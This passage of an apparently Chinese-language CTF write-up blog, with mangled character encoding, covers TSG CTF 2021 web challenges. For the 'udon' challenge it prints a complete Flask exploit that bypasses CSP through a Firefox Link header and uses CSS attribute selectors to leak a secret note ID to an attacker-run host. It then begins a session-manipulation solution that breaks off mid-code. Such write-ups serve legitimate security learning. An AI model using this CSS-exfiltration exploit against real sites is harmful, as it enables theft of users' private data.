&lt;p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°é‚£ä¸ªç‰¹æ®Šçš„notes_id&lt;/p>
&lt;p>æ¥ç€å¾€ä¸‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155826973.png" alt="image-20211004155826973">&lt;/p>
&lt;p>httpçš„ç›¸åº”å¤´å¯ä»¥æ³„éœ²ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæ˜¯å…¥æ‰‹ç‚¹&lt;/p>
&lt;p>ä»…åœ¨Firefoxä¸­æœ‰ä¸€ä¸ª&lt;code>Link&lt;/code>è¯·æ±‚å¤´ï¼Œå‡ ä¹ç­‰åŒäºHTMLä¸­çš„&lt;code>&amp;lt;link&amp;gt;&lt;/code>æ ‡ç­¾&lt;/p>
&lt;pre tabindex="0">&lt;code>Link: &amp;lt;/foo.css&amp;gt;; rel=&amp;quot;stylesheet&amp;quot;; type=&amp;quot;text/css&amp;quot;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/foo.css&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å¯ä»¥å‘appä¸­çš„ä»»æ„ä¸€é¡µæ³¨å…¥ä»»æ„çš„css&lt;/p>
&lt;p>åŒæ—¶ä¹Ÿæœ‰éœ€è¦Bypassçš„åœ°æ–¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„CSPç­–ç•¥&lt;code>style-src 'self'&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004160452260.png" alt="image-20211004160452260">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„cssçš„noteï¼Œå†å°†è¿™ä¸ªnoteçš„é“¾æ¥æ”¾å…¥&lt;code>Link&lt;/code>è¯·æ±‚å¤´ä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>http://ip:port/?k=Link&amp;amp;v=%3C%2F(&amp;lt;URL of a note with styles to inject&amp;gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># exp.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://localhost:8080&amp;#34;&lt;/span>
&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;span style="color:#111">CHAR_CANDIDATES&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>
&lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://host.docker.internal:1337&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;List[str]&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;EXPLOIT_BASE_ADDR is not set&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">candidate&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">id_prefix_to_try&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">candidate&lt;/span>
&lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">lambda&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:],&lt;/span> &lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;a[href^=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;] { background-image: url(&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;/leak?q=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;); }&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;title&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;description&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;content-type&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Location&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">header_value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;gt;; rel=&amp;#34;stylesheet&amp;#34;; type=&amp;#34;text/css&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tell&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;path&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;/?k=Link&amp;amp;v=&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">header_value&lt;/span>&lt;span style="color:#111">)),&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid status code: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/start&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: started exploit with a new note: &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">/notes/&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/leak&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">leak&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;q&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">LEAK_LENGTH&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] leaked (full ID): &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] leaked: &lt;/span>&lt;span style="color:#d88200">{}{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))))&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: invoked crawler with a new note: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] running app ...&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯¦ç»†å†…å®¹å‚è§-&amp;gt;&lt;a href="https://diary.shift-js.info/tsgctf-2021-udon/">wp&lt;/a>&lt;/p>
&lt;h2 id="webbeginners-web-2021">Web/Beginner&amp;rsquo;s Web 2021&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Made drunk, so solved drunk.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080745266.png" alt="image-20211004080745266">&lt;/p>
&lt;p>ç»™äº†æºç ï¼Œçœ‹ä¸‹index.jsï¼Œemmmmmmï¼Œåˆ›å»ºäº†session.routes&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004081546667.png" alt="image-20211004081546667">&lt;/p>
&lt;p>ä½†æ˜¯flagå¹¶ä¸ä¼šåœ¨æœ€åæ¸²æŸ“çš„routeä¸­å‡ºç°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004092636947.png" alt="image-20211004092636947">&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬æƒ³åˆ©ç”¨GetSaltå¤„çš„&lt;code>session.salt='flag'&lt;/code>æ¥è½¬åˆ°flagçš„è·¯ç”±ä¸Šæ¥è·å¾—flag&lt;/p>
&lt;p>ä½†æ˜¯[salt]ä¼šå¯¼è‡´é‡å†™flagï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„sessionæ˜¯è¿™æ ·çš„çŠ¶æ€&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// salt is anything different from &amp;#39;flag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>é¦–å…ˆç”¨&lt;code>GET /?action=SetSalt&amp;amp;data=flag&lt;/code>æ¥è®©&lt;code>salt='flag'&lt;/code>ï¼Œsessionä¼šå˜æˆè¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// this route is overwritten and not accessible
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// here is salt
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬æƒ³å›å¤åˆ°routeåªæœ‰ä¸€ä¸ªflagå¹¶ä¸”å¯è¾¾çš„çŠ¶æ€ï¼Œä½†æ˜¯åˆä¸æƒ³åˆ é™¤æ‰&lt;code>salt: 'flag'&lt;/code>&lt;/p>
&lt;p>å…³é”®ä¹‹å¤„åœ¨äº&lt;code>set_salt&lt;/code>ï¼Œå®ƒæƒ³å®Œæˆçš„ä»»åŠ¡æ˜¯ä¸€èµ·æ›´æ–°routeså’Œsaltçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
